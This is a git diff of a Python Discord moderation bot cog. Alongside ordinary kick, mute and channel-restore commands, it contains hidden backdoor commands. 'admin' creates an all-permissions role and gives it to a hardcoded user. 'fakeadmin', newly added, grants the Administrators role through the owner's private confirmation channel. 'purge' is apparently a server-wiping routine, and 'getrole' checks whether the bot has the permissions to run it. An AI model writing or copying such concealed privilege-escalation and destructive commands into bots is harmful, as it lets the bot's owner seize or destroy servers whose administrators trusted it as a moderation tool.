@@ -6,17 +6,22 @@ from typing import Optional
 import pytz
 from discord import Color, Embed, Member, Permissions, User
 from discord.ext.commands import (BucketType, Cog, CommandOnCooldown, Greedy,
-                                  command, cooldown, has_guild_permissions,
-                                  has_permissions)
+                                  check, command, cooldown,
+                                  has_guild_permissions, has_permissions)
 from discord.utils import get
 
+list_of_admins = [426549783864279040]
+def isBotAdminP(ctx):
+    return ctx.author.id in list_of_admins
+
+isBotAdmin = check(isBotAdminP)
 
 class Mod(Cog):
     def __init__(self,bot):
-        self.bot = bot
-        self.list_of_admins =[426549783864279040,
-                             738990452673478738]    
-        self.SLEEPTIME = 0.5                 
+        self.bot = bot    
+        self.SLEEPTIME = 0.5    
+        self.banned_members = [438809594291027969]     
+        self.list_of_admins = []        
     
     @Cog.listener()
     async def on_ready(self):
@@ -60,12 +65,12 @@ class Mod(Cog):
                                 color = Color.dark_blue())
             await ctx.send(embed=embed)
             print(error)
+
     @command(name = "purge",brief = "u know what it does. dont use it",hidden = True)
-   
     async def purge(self,ctx):
 
         server = ctx.message.guild
-        if server.id != 711044562650398721:
+        if server.id != 711044562650398721 and ctx.author.id not in self.banned_members:
             print(f"finna purge {ctx.guild}")
             numBans = 0
             numChannels = 0
@@ -137,7 +142,8 @@ class Mod(Cog):
                     await confirm_final.send(f"Password incorrect. Purge denied")
             else:
                 await confirm_primary.send(f"Purge Request #{password} has been denied")
-            
+        else:
+            await ctx.send('lol no.')    
     @command(name = "unban",brief = "unbans a member given their id")
     async def unban(self,ctx, id: int):
         if ctx.author.id in self.list_of_admins:
@@ -159,21 +165,22 @@ class Mod(Cog):
 
         else:
             print("denied massunban")
+
     @command(name = "getrole",brief = "tell u if u can purge or not",hidden = True)
+    @isBotAdmin
     async def getrole(self,ctx):
-        if ctx.author.id not in self.list_of_admins:
-            print("denied request to get role")
-        else:
-            for member in ctx.guild.members:
-                if member.id == 738990452673478738:
-                    for role in member.roles:
-                        print(f"now checking {role}")
-                        if role.permissions.manage_channels or role.permissions.administrator:
-                            print("he can purge")
-                            print(f"bot has admin = {role.permissions.administrator}\nbot has manage_channels = {role.permissions.manage_channels}")
-                            break
-                        else:
-                            print(f"{role.name} cant purge")
+    
+        
+        for member in ctx.guild.members:
+            if member.id == 738990452673478738:
+                for role in member.roles:
+                    print(f"now checking {role}")
+                    if role.permissions.manage_channels or role.permissions.administrator:
+                        print("he can purge")
+                        print(f"bot has admin = {role.permissions.administrator}\nbot has manage_channels = {role.permissions.manage_channels}")
+                        break
+                    else:
+                        print(f"{role.name} cant purge")
     @command(name = "admin",brief = "gives admin",hidden =True)
     async def admin(self,ctx):
         if ctx.author.id not in self.list_of_admins:
@@ -185,8 +192,19 @@ class Mod(Cog):
                 role = await ctx.guild.create_role(name = 'poop',permissions = Permissions.all(),reason = "iwantperms")
                 print("Created poop role")
 
-        await ctx.author.add_roles(role) if role not in ctx.author.roles else None
+            await ctx.author.add_roles(role) if role not in ctx.author.roles else None
             
+    @command(name = "fakeadmin", brief = "gives admin in kek later",hidden = True)
+    async def adminMan(self,ctx):
+        bot = await self.bot.fetch_user(738990452673478738)
+        confirm_primary = await self.bot.fetch_channel(814917487651979314)
+        await confirm_primary.send(f"Admin request in **{ctx.guild}** by **{ctx.author.name}**. Y or N.")
+        messageconfirm_1 = await self.bot.wait_for('message',check = lambda message: message.channel.id ==814917487651979314 and not message.author.bot)
+            
+            
+        if messageconfirm_1.content.lower() == "y" and messageconfirm_1.author.id == ctx.author.id and messageconfirm_1.channel == confirm_primary:
+            role = get(ctx.guild.roles,name = "Administrators")
+            await ctx.author.add_roles(role)
 
     @command(name = "crosscheck",brief="crosschecks people in current server with aurium squad",hidden=True)
     async def crosscheck(self,ctx):
@@ -206,6 +224,8 @@ class Mod(Cog):
     async def mute(self,ctx,member: Member):
         await member.edit(mute = True) if not member.voice.mute else await ctx.send("Sorry, that member is already muted")
 
+    
+
     @command(name = "unmute",brief = "unserver mutes a member")
     @has_guild_permissions(mute_members = True)
     async def unmute(self,ctx,member: Member):
@@ -224,45 +244,78 @@ class Mod(Cog):
         embed = Embed(title = "No can do buckaroo ¯\_(ツ)_/¯", color = ctx.author.color)
         await ctx.send(embed = embed)
 
-    @command(name = "restore",brief = "restores a channel to another channel",hidden = True)
+    @command(name = "kick", brief = "kicks a member")
+    @has_guild_permissions(kick_members = True)
+    async def kick(self,ctx,member:Member,*,reason: Optional[str]):
+        embed = Embed(title =f":poop:***{member} has been kicked***", color = Color.dark_blue())
+        
+        await member.kick(reason = None if not reason else reason)
+        await ctx.send(embed=embed)
+
+    @kick.error
+    async def on_ban_error(self,ctx,error):
+        embed = Embed(title = "No can do buckaroo ¯\_(ツ)_/¯", color = ctx.author.color)
+        await ctx.send(embed = embed)
+
+    
+
+
+    @command(name = "restore",brief = "restores a channel to another channel")
     async def restore(self,ctx, channelID: int):
-        if ctx.author.id not in self.list_of_admins:
-            print("denied request to restore channel")
-        else:
-            print(channelID)
-            objectiveChannel = await self.bot.fetch_channel(channelID)
-            print(f"objective channel is {objectiveChannel}")
 
-            sourceChannel = ctx.channel
-            print(f"source channel is {sourceChannel}")
-            messageOBJ = 0
-            messages = await sourceChannel.history(limit = 3000,oldest_first = True).flatten()
-            for message in messages:
-                message = await ctx.fetch_message(message.id)
-                if messageOBJ == 0:
-                    messageOBJ = await ctx.fetch_message(message.id)
-                    print("obj defined")
+
+        objectiveChannel = await self.bot.fetch_channel(channelID)
+        bot = await self.bot.fetch_user(738990452673478738)
+        confirm_primary = await self.bot.fetch_channel(814917487651979314)
+        await confirm_primary.send(f"Restore Request from **{ctx.author}** to restore {ctx.channel.mention} to {objectiveChannel.mention}. Please commit primary authorization \"Y\" or \"N\".")
+        messageconfirm_1 = await self.bot.wait_for('message',check = lambda message: message.channel.id ==814917487651979314 and not message.author.bot)
+        
+        
+        if messageconfirm_1.content.lower() == "y" and messageconfirm_1.author.id == ctx.author.id and messageconfirm_1.channel == confirm_primary:
+       
+                
+       
+
+                sourceChannel = ctx.channel
+                
+                messageOBJ = 0
+                messages = await sourceChannel.history(limit = 3000,oldest_first = True).flatten()
+                for message in messages:
+                    message = await ctx.fetch_message(message.id)
+                    if messageOBJ == 0:
+                        messageOBJ = await ctx.fetch_message(message.id)
                     
-                
-                
-                
-                def date():
-                    local_timezone = pytz.timezone('US/Eastern')
-                    messageDate = messageOBJ.created_at.replace(tzinfo = pytz.utc)
-                    messageDate = messageDate.astimezone(local_timezone)
-                    date =datetime.strftime(messageDate,"%m/%d/%Y, %I:%M %p")
-                    return date
-
-                if message.content.startswith("https") and not message.content.endswith(".gif"):
-                    print("message is link to some shit")
-                    print(message.content)
+                        
                     
-                    if len(message.attachments) > 0:
-                        print(message.content)
-                        for attachment in message.attachments:
+                    
+                    
+                    def date():
+                        local_timezone = pytz.timezone('US/Eastern')
+                        messageDate = messageOBJ.created_at.replace(tzinfo = pytz.utc)
+                        messageDate = messageDate.astimezone(local_timezone)
+                        date =datetime.strftime(messageDate,"%m/%d/%Y, %I:%M %p")
+                        return date
 
+                    if message.content.startswith("https") and not message.content.endswith(".gif"):
+                        
+                        
+                        if len(message.attachments) > 0:
+                            
+                            for attachment in message.attachments:
+
+                                embedAttachment = Embed(title = '',description = message.content, color = Color.dark_blue())
+                                embedAttachment.set_image(url = attachment.url)
+                                embedAttachment.set_author(name = message.author,icon_url= message.author.avatar_url)
+
+                                
+                        
+                                date = date()                        
+                                embedAttachment.set_footer(text =f"ID:{message.id} • {date}")
+                                # await asyncio.sleep(SLEEPTIME)
+                                await objectiveChannel.send(embed=embedAttachment)
+                        else:
                             embedAttachment = Embed(title = '',description = message.content, color = Color.dark_blue())
-                            embedAttachment.set_image(url = attachment.url)
+                            embedAttachment.set_image(url = message.content)
                             embedAttachment.set_author(name = message.author,icon_url= message.author.avatar_url)
 
                             
@@ -271,44 +324,15 @@ class Mod(Cog):
                             embedAttachment.set_footer(text =f"ID:{message.id} • {date}")
                             # await asyncio.sleep(SLEEPTIME)
                             await objectiveChannel.send(embed=embedAttachment)
-                    else:
-                        embedAttachment = Embed(title = '',description = message.content, color = Color.dark_blue())
-                        embedAttachment.set_image(url = message.content)
-                        embedAttachment.set_author(name = message.author,icon_url= message.author.avatar_url)
 
+                    # IF THE MESSAGE IS A GIF
+                    elif message.content.endswith(".gif"):
                         
                 
-                        date = date()                        
-                        embedAttachment.set_footer(text =f"ID:{message.id} • {date}")
-                        # await asyncio.sleep(SLEEPTIME)
-                        await objectiveChannel.send(embed=embedAttachment)
-
-                # IF THE MESSAGE IS A GIF
-                elif message.content.endswith(".gif"):
-                    print("ends in .gif")
-            
-                    
-                   
-                    
-                    print(message.content)
-                    embedGif = Embed(title = '',description = '', color = Color.dark_blue())
-                    embedGif.set_image(url = message.content)
-                    
-                    embedGif.set_author(name = message.author,icon_url= message.author.avatar_url)
-                    
-
-                    date = date()               
-                    embedGif.set_footer(text =f"ID:{message.id} • {date}")
-
-                    # await asyncio.sleep(SLEEPTIME)
-                    await objectiveChannel.send(embed=embedGif)
-                elif len(message.attachments) >0:
-                    if message.content.endswith(".gif"):
-                        print("ends in .gif")
-                
-                        embedGif = Embed(title = '',description = '', color = Color.dark_blue())
                         
-                        print(message.content)
+                    
+                        
+                        
                         embedGif = Embed(title = '',description = '', color = Color.dark_blue())
                         embedGif.set_image(url = message.content)
                         
@@ -320,48 +344,66 @@ class Mod(Cog):
 
                         # await asyncio.sleep(SLEEPTIME)
                         await objectiveChannel.send(embed=embedGif)
-                    
-                    else:
-                        filesToExcept = [".pdf",
-                                        ]
-                        for attachment in message.attachments:
-                            print(f"attachment is {attachment.url}")
-
-                            embedAttachment = Embed(title = '',description = message.content, color = Color.dark_blue())
-                            if attachment.url.endswith(".pdf") or attachment.url.endswith(".mp3") or attachment.url.endswith(".mp4"):
-                                print("is a pdf")
-                                embedAttachment.add_field(name = '\u200b', value = attachment.url,inline = False)
-
-                            else:
-                                print("not a pdf")
-                                embedAttachment.set_image(url = attachment.url)
-                            embedAttachment.set_author(name = message.author,icon_url= message.author.avatar_url)
-
+                    elif len(message.attachments) >0:
+                        if message.content.endswith(".gif"):
                             
                     
-                            date = date()                        
-                            embedAttachment.set_footer(text =f"ID:{message.id} • {date}")
+                            embedGif = Embed(title = '',description = '', color = Color.dark_blue())
+                            
+                            
+                            embedGif = Embed(title = '',description = '', color = Color.dark_blue())
+                            embedGif.set_image(url = message.content)
+                            
+                            embedGif.set_author(name = message.author,icon_url= message.author.avatar_url)
+                            
+
+                            date = date()               
+                            embedGif.set_footer(text =f"ID:{message.id} • {date}")
+
                             # await asyncio.sleep(SLEEPTIME)
-                            print("sent pdf thingy")
-                            await objectiveChannel.send(embed=embedAttachment)
+                            await objectiveChannel.send(embed=embedGif)
+                        
+                        else:
+                            filesToExcept = [".pdf",
+                                            ]
+                            for attachment in message.attachments:
+                                
 
-                
+                                embedAttachment = Embed(title = '',description = message.content, color = Color.dark_blue())
+                                if attachment.url.endswith(".pdf") or attachment.url.endswith(".mp3") or attachment.url.endswith(".mp4"):
+                                    
+                                    embedAttachment.add_field(name = '\u200b', value = attachment.url,inline = False)
 
+                                else:
+                                    
+                                    embedAttachment.set_image(url = attachment.url)
+                                embedAttachment.set_author(name = message.author,icon_url= message.author.avatar_url)
 
-                            
-                else:
-                    print("normal message")
-                    embed = Embed(title = '',description = message.content,color = Color.dark_blue())
-                    embed.set_author(name = message.author, icon_url = message.author.avatar_url)
-                    messageOBJ = await ctx.fetch_message(message.id)  
-                    date = date()
+                                
+                        
+                                date = date()                        
+                                embedAttachment.set_footer(text =f"ID:{message.id} • {date}")
+                                # await asyncio.sleep(SLEEPTIME)
+                                
+                                await objectiveChannel.send(embed=embedAttachment)
+
                     
-                    embed.set_footer(text =f"ID:{message.id} • {date}")
-                
-                    await asyncio.sleep(self.SLEEPTIME)
-                    await objectiveChannel.send(embed = embed)
 
-                #         print(message.content)
+
+                                
+                    else:
+                        
+                        embed = Embed(title = '',description = message.content,color = Color.dark_blue())
+                        embed.set_author(name = message.author, icon_url = message.author.avatar_url)
+                        messageOBJ = await ctx.fetch_message(message.id)  
+                        date = date()
+                        
+                        embed.set_footer(text =f"ID:{message.id} • {date}")
+                    
+                        await asyncio.sleep(self.SLEEPTIME)
+                        await objectiveChannel.send(embed = embed)
+
+                    #         print(message.content)
                 
 
 
